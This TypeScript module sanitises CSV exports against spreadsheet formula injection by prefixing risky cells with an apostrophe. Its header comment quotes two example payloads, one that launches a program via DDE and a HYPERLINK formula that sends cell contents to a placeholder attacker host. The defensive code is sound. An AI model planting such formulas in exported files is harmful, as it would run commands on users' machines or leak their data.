/**
 * CSV formula injection.
 *
 * A cell beginning with =, +, -, @, tab or carriage return is executable when the
 * file is opened in Excel, Google Sheets or LibreOffice. `=cmd|'/c calc'!A1` is the
 * classic proof; `=HYPERLINK("http://attacker/"&A1)` quietly exfiltrates the cell
 * next to it.
 *
 * SEO OS never evaluates a cell, so an imported value is inert while it lives here.
 * The risk is on the way out: the moment any of this is exported, or copied into a
 * spreadsheet by a person, the payload is live again — and it would carry our name
 * on it.
 *
 * So the rule is asymmetric on purpose:
 *
 *   - **Storage keeps the original text.** Mangling it on the way in would corrupt
 *     legitimate values — "-5" is a real position change, "+1 rank" is a real
 *     phrase, and a keyword genuinely can begin with @.
 *   - **Export neutralises it.** A leading apostrophe tells every spreadsheet to
 *     treat what follows as text, and is stripped again on re-import.
 *
 * The pair matters: neutralising at both ends would double-escape, and at neither
 * would ship the vulnerability.
 */

/** Characters that make a spreadsheet treat a cell as a formula. */
const FORMULA_PREFIXES = ["=", "+", "-", "@", "\t", "\r"];

export function isFormulaLike(value: string): boolean {
  return FORMULA_PREFIXES.some((prefix) => value.startsWith(prefix));
}

/**
 * Makes a value safe to write into a file somebody will open in a spreadsheet.
 *
 * Apply at the export boundary only — never before storing, or the stored value
 * stops being what the file actually said.
 */
export function neutralizeForExport(value: string): string {
  return isFormulaLike(value) ? `'${value}` : value;
}

/** Quotes a single field for CSV output, neutralising formulas first. */
export function toCsvField(value: string): string {
  const safe = neutralizeForExport(value);

  return /[",\r\n]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
}

/** Renders rows as CSV text with every cell neutralised. */
export function toCsv(headers: string[], rows: Record<string, string>[]): string {
  const lines = [headers.map(toCsvField).join(",")];

  for (const row of rows) {
    lines.push(headers.map((header) => toCsvField(row[header] ?? "")).join(","));
  }

  return lines.join("\r\n");
}
